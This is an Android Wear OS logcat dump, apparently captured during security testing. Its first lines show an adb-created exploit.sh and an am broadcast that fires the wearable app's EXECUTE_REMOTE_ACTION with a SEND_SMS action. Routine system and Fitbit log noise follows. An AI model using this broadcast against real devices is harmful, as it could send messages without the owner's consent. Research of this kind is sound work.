--------- beginning of main
06-30 03:15:37.120  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:cat > /data/local/tmp/exploit.sh << 'SCRIPT'
06-30 03:15:37.120  1226  1226 I adbd    : #!/system/bin/sh
06-30 03:15:37.120  1226  1226 I adbd    : # Exploit: Trigger ExecuteRemoteActionService with SMS Parcelable intent
06-30 03:15:37.120  1226  1226 I adbd    : # This simulates what the phone-side PoC delivers via Data Layer
06-30 03:15:37.120  1226  1226 I adbd    : 
06-30 03:15:37.120  1226  1226 I adbd    : am broadcast   -a "com.google.android.wearable.action.EXECUTE_REMOTE_ACTION"   -p "com.google.android.wearable.app"   --es "com.google.android.wearable.intent.localedition.extra.ACTION" "com.google.android.clockwork.home.localedition.action.SEND_SMS"
06-30 03:15:37.120  1226  1226 I adbd    : SCRIPT
06-30 03:15:37.120  1226  1226 I adbd    : chmod 755 /data/local/tmp/exploit.sh'
06-30 03:15:37.274  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:am broadcast -a com.google.android.wearable.action.EXECUTE_REMOTE_ACTION -p com.google.android.wearable.app --es com.google.android.wearable.intent.localedition.extra.ACTION com.google.android.clockwork.home.localedition.action.SEND_SMS'
06-30 03:15:37.368  1719  3326 I ActivityManager: Broadcasting: Intent { act=com.google.android.wearable.action.EXECUTE_REMOTE_ACTION flg=0x400000 pkg=com.google.android.wearable.app (has extras) }
06-30 03:15:37.370  1719  1746 I ActivityManager: Broadcast completed: result=0
--------- beginning of system
06-30 03:15:37.370  1719  3326 I ActivityManager: Enqueued broadcast Intent { act=com.google.android.wearable.action.EXECUTE_REMOTE_ACTION flg=0x400000 pkg=com.google.android.wearable.app (has extras) }: 0
06-30 03:15:39.423  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:15:39.423  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:15:39.428  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:15:39.431  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:15:39.432  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:15:39.437  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:15:39.437  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:15:39.438  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:15:39.439  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:15:39.439  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:15:40.397  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color:export ANDROID_LOG_TAGS=''; exec logcat '-d''
06-30 03:15:40.482  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:dumpsys activity services'
06-30 03:15:41.173  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 3.52/25000.0, IsHighLux: false
06-30 03:15:42.464  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:15:43.161   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:15:43.167  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:15:43.175  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:15:45.500  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:15:45.883  1719  1736 I system_server: Background young concurrent mark compact GC freed 3280KB AllocSpace bytes, 6(120KB) LOS objects, 87% free, 31MB/256MB, paused 4.187ms,7.723ms total 124.777ms
06-30 03:15:46.670   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:15:48.543  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:15:50.706  1628  1654 I pixel-thermal: CDEV log 
06-30 03:15:51.487   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:15:51.601   721   859 D MCU     : site_data_provider.cc:220        16:30:34.360 [SiteDataProvider] Flushing 1 GROK records
06-30 03:15:51.603   721   859 D MCU     : site_data_provider.cc:220        16:30:34.360 [SiteDataProvider] Flushing 1 GROK records
06-30 03:15:51.609  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:15:51.610  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:15:51.610  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:15:51.614  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:15:51.614  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:15:51.615  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:15:51.617  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:15:51.618  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:15:51.618  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:15:51.619  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:15:52.963  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.00125/25000.0, IsHighLux: false
06-30 03:15:53.181  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.017999586/25000.0, IsHighLux: false
06-30 03:15:53.362  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.02625/25000.0, IsHighLux: false
06-30 03:15:53.981  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.042999584/25000.0, IsHighLux: false
06-30 03:15:54.166  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.05125/25000.0, IsHighLux: false
06-30 03:15:54.663  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:15:55.584  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.9516645/25000.0, IsHighLux: false
06-30 03:15:56.817  1719  3757 D ActivityManager: sync unfroze 17828 com.google.android.wearable.protolayout.renderer for 6
06-30 03:15:56.829  1719  1901 I SensorService: Setting connection 0xe47359c0 disabled status to 0 for reason 2
06-30 03:15:56.832  1719  3326 D ActivityManager: sync unfroze 8905 com.fitbit.FitbitMobile for 6
06-30 03:15:56.836  1719  1901 I SensorService: Setting connection 0xe47359c0 disabled status to 0 for reason 0
06-30 03:15:56.843  1719  3621 W ProcessStats: Tracking association SourceState{62fbff0 com.google.android.wearable.sysui/10068 BTop #20074} whose proc state 2 is better than process ProcessState{68b7ba9 com.google.android.wearable.protolayout.renderer/10117 pkg=com.google.android.wearable.protolayout.renderer} proc state 14 (0 skipped)
06-30 03:15:56.855  1719  1905 W JobServiceContext: Sending onNetworkChanged for a job that isn't started. JobStatus{38c6107 androidx.work.systemjobscheduler:u0a111/824 #SyncWorker#@androidx.work.systemjobscheduler@com.fitbit.FitbitMobile/androidx.work.impl.background.systemjob.SystemJobService u=0 s=10111 TIME=-14s501ms:none NET READY}
06-30 03:15:56.876  1719  3757 D ConnectivityService: requestNetwork for uid/pid:10111/8905 activeRequest: null callbackRequest: 399 [NetworkRequest [ REQUEST id=400, [ Capabilities: INTERNET&NOT_RESTRICTED&TRUSTED&NOT_VCN_MANAGED&NOT_BANDWIDTH_CONSTRAINED Uid: 10111 RequestorUid: 10111 RequestorPkg: com.fitbit.FitbitMobile UnderlyingNetworks: Null] ]] callback flags: 0 order: 2147483647 isUidTracked: false declaredMethods: AVAIL|LOST|NC|BLK
06-30 03:15:56.877  1719  1974 D NetworkRequestStateStatsMetrics: Registered nr with ID = 400, package_uid = 10111
06-30 03:15:56.883  1719  1719 D WEAR_NETWORK_OBSERVER: got request NetworkRequest [ REQUEST id=400, [ Capabilities: INTERNET&NOT_RESTRICTED&TRUSTED&NOT_VCN_MANAGED&NOT_BANDWIDTH_CONSTRAINED Uid: 10111 RequestorUid: 10111 RequestorPkg: com.fitbit.FitbitMobile UnderlyingNetworks: Null] ]
06-30 03:15:56.884  1719  1967 D WifiNetworkFactory: got request NetworkRequest [ REQUEST id=400, [ Capabilities: INTERNET&NOT_RESTRICTED&TRUSTED&NOT_VCN_MANAGED&NOT_BANDWIDTH_CONSTRAINED Uid: 10111 RequestorUid: 10111 RequestorPkg: com.fitbit.FitbitMobile UnderlyingNetworks: Null] ]
06-30 03:15:56.885  1719  1967 D UntrustedWifiNetworkFactory: got request NetworkRequest [ REQUEST id=400, [ Capabilities: INTERNET&NOT_RESTRICTED&TRUSTED&NOT_VCN_MANAGED&NOT_BANDWIDTH_CONSTRAINED Uid: 10111 RequestorUid: 10111 RequestorPkg: com.fitbit.FitbitMobile UnderlyingNetworks: Null] ]
06-30 03:15:56.885  1719  1967 D OemPaidWifiNetworkFactory: got request NetworkRequest [ REQUEST id=400, [ Capabilities: INTERNET&NOT_RESTRICTED&TRUSTED&NOT_VCN_MANAGED&NOT_BANDWIDTH_CONSTRAINED Uid: 10111 RequestorUid: 10111 RequestorPkg: com.fitbit.FitbitMobile UnderlyingNetworks: Null] ]
06-30 03:15:56.886  1719  1967 D MultiInternetWifiNetworkFactory: got request NetworkRequest [ REQUEST id=400, [ Capabilities: INTERNET&NOT_RESTRICTED&TRUSTED&NOT_VCN_MANAGED&NOT_BANDWIDTH_CONSTRAINED Uid: 10111 RequestorUid: 10111 RequestorPkg: com.fitbit.FitbitMobile UnderlyingNetworks: Null] ]
06-30 03:15:56.887  1719  1974 D ConnectivityService: NetReassign [400 : null → 109] [c 1] [a 3] [i 6]
06-30 03:15:56.916  8905  8905 W it.FitbitMobile: Monitor::Inflate: Install failed 0x940d3c18
06-30 03:15:56.931  8905  8925 W it.FitbitMobile: Monitor::Inflate: Install failed 0xcc00d3b8
06-30 03:15:56.998   335   335 E KeymasterUtils: rsp_header->status: -28
06-30 03:15:56.998   335   335 E KeyMasterHalDevice: abort_operation
06-30 03:15:56.998   335   335 E KeyMasterHalDevice: ret: -28
06-30 03:15:57.036   335   335 E KeymasterUtils: rsp_header->status: -28
06-30 03:15:57.036   335   335 E KeyMasterHalDevice: abort_operation
06-30 03:15:57.036   335   335 E KeyMasterHalDevice: ret: -28
06-30 03:15:57.051   896   952 I WHSHAL  : Flush Request: Id = 54 For: OEM_METRIC_DATA_TYPE_AZM_PASSIVE PASSIVE_STEP_COUNT PASSIVE_DISTANCE HEART_RATE_BPM OEM_METRIC_DATA_TYPE_FITBIT_SITE PASSIVE_ALL_CALORIES OEM_METRIC_DATA_TYPE_NIGHTTIME_SPO2 OEM_METRIC_DATA_TYPE_SKIN_TEMP PASSIVE_FLOORS OEM_METRIC_DATA_TYPE_MSA  Mapped to: kAzmAlwaysOn kStepCounterAlwaysOn kDistanceAlwaysOn kHeartRate kFitbitSiteData kCaloriesTotalAlwaysOn kFlightsOfStairsAlwaysOn 
06-30 03:15:57.061   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:15:57.065   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:15:57.069   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:15:57.072   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c001024
06-30 03:15:57.076   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c001023
06-30 03:15:57.081   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c001049
06-30 03:15:57.084   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c001049
06-30 03:15:57.102   721   859 D MCU     : host_link.cc:456                 16:30:40.118 Parsed nanoapp message from host: app ID 0x476f6f676c003000 endpoint 0x9026 msgType 1 payload size 11
06-30 03:15:57.102   721   859 I MCU     : fitbit_app_manager.cc:1052       16:30:40.118 [Algolib] Flushing Fitbit Site Data from explicit request!
06-30 03:15:57.102   721   859 D MCU     : host_link.cc:456                 16:30:40.121 Parsed nanoapp message from host: app ID 0x476f6f676c003000 endpoint 0x9026 msgType 4 payload size 3
06-30 03:15:57.103   721   859 D MCU     : host_link.cc:456                 16:30:40.125 Parsed nanoapp message from host: app ID 0x476f6f676c003000 endpoint 0x9026 msgType 4 payload size 3
06-30 03:15:57.103   721   859 D MCU     : host_link.cc:456                 16:30:40.128 Parsed nanoapp message from host: app ID 0x476f6f676c001024 endpoint 0x9026 msgType 4 payload size 3
06-30 03:15:57.104   721   859 D MCU     : host_link.cc:456                 16:30:40.132 Parsed nanoapp message from host: app ID 0x476f6f676c001023 endpoint 0x9026 msgType 4 payload size 3
06-30 03:15:57.105   721   859 D MCU     : host_link.cc:456                 16:30:40.136 Parsed nanoapp message from host: app ID 0x476f6f676c001049 endpoint 0x9026 msgType 4 payload size 2
06-30 03:15:57.106   721   859 D MCU     : host_link.cc:456                 16:30:40.140 Parsed nanoapp message from host: app ID 0x476f6f676c001049 endpoint 0x9026 msgType 4 payload size 3
06-30 03:15:57.145   335   335 E KeymasterUtils: rsp_header->status: -28
06-30 03:15:57.145   335   335 E KeyMasterHalDevice: abort_operation
06-30 03:15:57.145   335   335 E KeyMasterHalDevice: ret: -28
06-30 03:15:57.176   335   335 E KeymasterUtils: rsp_header->status: -28
06-30 03:15:57.177   335   335 E KeyMasterHalDevice: abort_operation
06-30 03:15:57.177   335   335 E KeyMasterHalDevice: ret: -28
06-30 03:15:57.211   335   335 E KeymasterUtils: rsp_header->status: -28
06-30 03:15:57.211   335   335 E KeyMasterHalDevice: abort_operation
06-30 03:15:57.211   335   335 E KeyMasterHalDevice: ret: -28
06-30 03:15:57.316   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:15:57.702  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:15:57.702  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:15:57.706  8905  8905 W JobService: onNetworkChanged() not implemented in androidx.work.impl.background.systemjob.SystemJobService. Must override in a subclass.
06-30 03:15:57.710  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:15:57.712  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:15:57.713  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:15:57.713  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:15:57.715  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:15:57.716  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:15:57.719  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:15:57.720  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:15:58.661  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@b0a3be6
06-30 03:15:58.780  1719  2375 W ActivityManager: Unable to start service Intent { act=android.support.wearable.complications.ACTION_WEAR_SDK_COMPLICATION_UPDATE_REQUEST xflg=0x4 cmp=com.fitbit.FitbitMobile/com.google.android.wearable.fitbit.mainapp.complications.offloadable.cardioload.OffloadableCardioLoadComplicationDataSourceService } U=0: not found
06-30 03:15:58.782  1719  2375 W ActivityManager: Unable to start service Intent { act=android.support.wearable.complications.ACTION_WEAR_SDK_COMPLICATION_UPDATE_REQUEST xflg=0x4 cmp=com.fitbit.FitbitMobile/com.google.android.wearable.fitbit.mainapp.complications.offloadable.floors.OffloadableFloorsComplicationDataSourceService } U=0: not found
06-30 03:15:58.782  1719  3757 W ActivityManager: Unable to start service Intent { act=android.support.wearable.complications.ACTION_WEAR_SDK_COMPLICATION_UPDATE_REQUEST xflg=0x4 cmp=com.fitbit.FitbitMobile/com.google.android.wearable.fitbit.mainapp.complications.offloadable.azm.OffloadableAZMComplicationDataSourceService } U=0: not found
06-30 03:15:58.783  1719  3621 W ActivityManager: Unable to start service Intent { act=android.support.wearable.complications.ACTION_WEAR_SDK_COMPLICATION_UPDATE_REQUEST xflg=0x4 cmp=com.fitbit.FitbitMobile/com.google.android.wearable.fitbit.mainapp.complications.offloadable.calories.OffloadableCaloriesComplicationDataSourceService } U=0: not found
06-30 03:15:58.784  1719  3757 W ActivityManager: Unable to start service Intent { act=android.support.wearable.complications.ACTION_WEAR_SDK_COMPLICATION_UPDATE_REQUEST xflg=0x4 cmp=com.fitbit.FitbitMobile/com.google.android.wearable.fitbit.mainapp.complications.offloadable.distance.OffloadableDistanceComplicationDataSourceService } U=0: not found
06-30 03:15:58.787  1719  2375 W ActivityManager: Unable to start service Intent { act=android.support.wearable.complications.ACTION_WEAR_SDK_COMPLICATION_UPDATE_REQUEST xflg=0x4 cmp=com.fitbit.FitbitMobile/com.google.android.wearable.fitbit.mainapp.complications.exercisequicklaunch.ExerciseQuickLaunchComplicationDataSourceService } U=0: not found
06-30 03:15:58.794  1719  3757 W ActivityManager: Unable to start service Intent { act=android.support.wearable.complications.ACTION_WEAR_SDK_COMPLICATION_UPDATE_REQUEST xflg=0x4 cmp=com.fitbit.FitbitMobile/com.google.android.wearable.fitbit.mainapp.complications.offloadable.exercisedays.OffloadableExerciseDaysComplicationDataSourceService } U=0: not found
06-30 03:15:58.817   335   335 E KeymasterUtils: rsp_header->status: -28
06-30 03:15:58.817   335   335 E KeyMasterHalDevice: abort_operation
06-30 03:15:58.817   335   335 E KeyMasterHalDevice: ret: -28
06-30 03:15:58.867   335   335 E KeymasterUtils: rsp_header->status: -28
06-30 03:15:58.868   335   335 E KeyMasterHalDevice: abort_operation
06-30 03:15:58.868   335   335 E KeyMasterHalDevice: ret: -28
06-30 03:15:58.892   335   335 E KeymasterUtils: rsp_header->status: -28
06-30 03:15:58.893   335   335 E KeyMasterHalDevice: abort_operation
06-30 03:15:58.893   335   335 E KeyMasterHalDevice: ret: -28
06-30 03:15:58.903   335   335 E KeymasterUtils: rsp_header->status: -28
06-30 03:15:58.903   335   335 E KeyMasterHalDevice: abort_operation
06-30 03:15:58.903   335   335 E KeyMasterHalDevice: ret: -28
06-30 03:15:59.109   721   859 D MCU     : host_link.cc:456                 16:30:41.869 Parsed nanoapp message from host: app ID 0x476f6f676c003000 endpoint 0x9026 msgType 5 payload size 24
06-30 03:15:59.110   721   859 D MCU     : calories_consumer.cc:58          16:30:41.870 Calories Config user param with height_cm=165 weight_100g=600 age=24 sex=1 rhr=78
06-30 03:15:59.110   721   859 W MCU     : calories_consumer.cc:112         16:30:41.870 Calories Config body data with height_mm=1650 decikilogram=600 age=24 is_female=0 bmr_times_10k=10538 rhr=78
06-30 03:15:59.110   721   859 I MCU     : calories_consumer.cc:115         16:30:41.870 Calories User profile updated with err=0
06-30 03:15:59.111   721   859 D MCU     : calories_consumer.cc:58          16:30:41.870 Calories Config user param with height_cm=165 weight_100g=600 age=24 sex=1 rhr=78
06-30 03:15:59.111   721   859 W MCU     : calories_consumer.cc:112         16:30:41.870 Calories Config body data with height_mm=1650 decikilogram=600 age=24 is_female=0 bmr_times_10k=10538 rhr=78
06-30 03:15:59.111   721   859 I MCU     : calories_consumer.cc:115         16:30:41.870 Calories User profile updated with err=0
06-30 03:15:59.112   721   859 D MCU     : host_link.cc:456                 16:30:41.871 Parsed nanoapp message from host: app ID 0x476f6f676c003004 endpoint 0x9026 msgType 1 payload size 60
06-30 03:15:59.112   721   859 I MCU     : exercise_tracking_app_manager.cc:513 16:30:41.872 [ExerciseTracking] HAL message type 2:
06-30 03:15:59.112   721   859 I MCU     : exercise_tracking_app_manager.cc:533 16:30:41.872 [ExerciseTracking] Received activity configuration: exercise_type 4 disable_auto_start 0 notification_latency_ms 120000
06-30 03:15:59.113   721   859 I MCU     : exercise_tracking_app_manager.cc:533 16:30:41.872 [ExerciseTracking] Received activity configuration: exercise_type 34 disable_auto_start 0 notification_latency_ms 120000
06-30 03:15:59.114   721   859 I MCU     : exercise_tracking_app_manager.cc:533 16:30:41.872 [ExerciseTracking] Received activity configuration: exercise_type 68 disable_auto_start 0 notification_latency_ms 180000
06-30 03:15:59.114   721   859 I MCU     : exercise_tracking_app_manager.cc:533 16:30:41.872 [ExerciseTracking] Received activity configuration: exercise_type 2 disable_auto_start 0 notification_latency_ms 120000
06-30 03:15:59.115   721   859 I MCU     : exercise_tracking_app_manager.cc:533 16:30:41.872 [ExerciseTracking] Received activity configuration: exercise_type 5 disable_auto_start 0 notification_latency_ms 180000
06-30 03:15:59.275  8905  8999 I cn_CronetUrlRequestContext: destroyNativeStreamLocked org.chromium.net.impl.CronetBidirectionalStream@6716e39
06-30 03:15:59.325  8905  8932 E NL_lfx  : The current flow is using the non-account scoped interceptor
06-30 03:15:59.325  8905  8932 E NL_lfx  : adbi: FULL
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at lfx.a(PG:82)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at dow.invokeSuspend(PG:278)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at dow.invoke(PG:118)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at lfs.invokeSuspend(PG:382)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at ahrk.resumeWith(PG:11)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at ahzh.run(PG:112)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at abxe.run(PG:179)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at abxe.run(PG:158)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at myb.run(PG:5)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at adfz.run(PG:44)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at haz.run(PG:328)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at java.lang.Thread.run(Thread.java:1572)
06-30 03:15:59.325  8905  8932 E NL_lfx  : 	at mzn.run(PG:54)
06-30 03:15:59.326  8905  8925 E NL_lfx  : The current flow is using the non-account scoped interceptor
06-30 03:15:59.326  8905  8925 E NL_lfx  : adbi: FULL
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at lfx.a(PG:82)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at dow.invokeSuspend(PG:278)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at dow.invoke(PG:118)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at lfs.invokeSuspend(PG:382)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at ahrk.resumeWith(PG:11)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at ahzh.run(PG:112)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at abxe.run(PG:179)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at abxe.run(PG:158)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at myb.run(PG:5)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at adfz.run(PG:44)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at haz.run(PG:328)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at java.lang.Thread.run(Thread.java:1572)
06-30 03:15:59.326  8905  8925 E NL_lfx  : 	at mzn.run(PG:54)
06-30 03:15:59.342  8905 20604 W it.FitbitMobile: Monitor::Inflate: Install failed 0xcc0bd400
06-30 03:15:59.559  8905  8933 E NL_lfx  : The current flow is using the non-account scoped interceptor
06-30 03:15:59.559  8905  8933 E NL_lfx  : adbi: FULL
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at lfx.a(PG:82)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at dow.invokeSuspend(PG:278)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at dow.invoke(PG:118)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at lfs.invokeSuspend(PG:382)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at ahrk.resumeWith(PG:11)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at ahzh.run(PG:112)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at abxe.run(PG:179)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at abxe.run(PG:158)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at myb.run(PG:5)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at adfz.run(PG:44)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at haz.run(PG:328)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at java.lang.Thread.run(Thread.java:1572)
06-30 03:15:59.559  8905  8933 E NL_lfx  : 	at mzn.run(PG:54)
06-30 03:15:59.576  8905  8932 E NL_lfx  : The current flow is using the non-account scoped interceptor
06-30 03:15:59.576  8905  8932 E NL_lfx  : adbi: FULL
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at lfx.a(PG:82)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at dow.invokeSuspend(PG:278)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at dow.invoke(PG:118)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at lfs.invokeSuspend(PG:382)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at ahrk.resumeWith(PG:11)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at ahzh.run(PG:112)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at abxe.run(PG:179)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at abxe.run(PG:158)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at myb.run(PG:5)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at adfz.run(PG:44)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at haz.run(PG:328)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at java.lang.Thread.run(Thread.java:1572)
06-30 03:15:59.576  8905  8932 E NL_lfx  : 	at mzn.run(PG:54)
06-30 03:15:59.583  8905  8925 E NL_lfx  : The current flow is using the non-account scoped interceptor
06-30 03:15:59.583  8905  8925 E NL_lfx  : adbi: FULL
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at lfx.a(PG:82)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at dow.invokeSuspend(PG:278)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at dow.invoke(PG:118)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at lfs.invokeSuspend(PG:382)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at ahrk.resumeWith(PG:11)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at ahzh.run(PG:112)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at abxe.run(PG:179)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at abxe.run(PG:158)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at myb.run(PG:5)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at adfz.run(PG:44)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at haz.run(PG:328)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at java.lang.Thread.run(Thread.java:1572)
06-30 03:15:59.583  8905  8925 E NL_lfx  : 	at mzn.run(PG:54)
06-30 03:15:59.594  8905  8933 E NL_lfx  : The current flow is using the non-account scoped interceptor
06-30 03:15:59.594  8905  8933 E NL_lfx  : adbi: FULL
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at lfx.a(PG:82)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at dow.invokeSuspend(PG:278)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at dow.invoke(PG:118)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at lfs.invokeSuspend(PG:382)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at ahrk.resumeWith(PG:11)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at ahzh.run(PG:112)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at abxe.run(PG:179)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at abxe.run(PG:158)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at myb.run(PG:5)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at adfz.run(PG:44)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at haz.run(PG:328)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at java.lang.Thread.run(Thread.java:1572)
06-30 03:15:59.594  8905  8933 E NL_lfx  : 	at mzn.run(PG:54)
06-30 03:15:59.596  8905  8937 E NL_lfx  : The current flow is using the non-account scoped interceptor
06-30 03:15:59.596  8905  8937 E NL_lfx  : adbi: FULL
06-30 03:15:59.596  8905  8937 E NL_lfx  : 	at lfx.a(PG:82)
06-30 03:15:59.596  8905  8937 E NL_lfx  : 	at dow.invokeSuspend(PG:278)
06-30 03:15:59.596  8905  8937 E NL_lfx  : 	at dow.invoke(PG:118)
06-30 03:15:59.596  8905  8937 E NL_lfx  : 	at lfs.invokeSuspend(PG:382)
06-30 03:15:59.596  8905  8937 E NL_lfx  : 	at ahrk.resumeWith(PG:11)
06-30 03:15:59.596  8905  8937 E NL_lfx  : 	at ahzh.run(PG:112)
06-30 03:15:59.596  8905  8937 E NL_lfx  : 	at abxe.run(PG:179)
06-30 03:15:59.596  8905  8937 E NL_lfx  : 	at abxe.run(PG:158)
06-30 03:15:59.596  8905  8937 E NL_lfx  : 	at myb.run(PG:5)
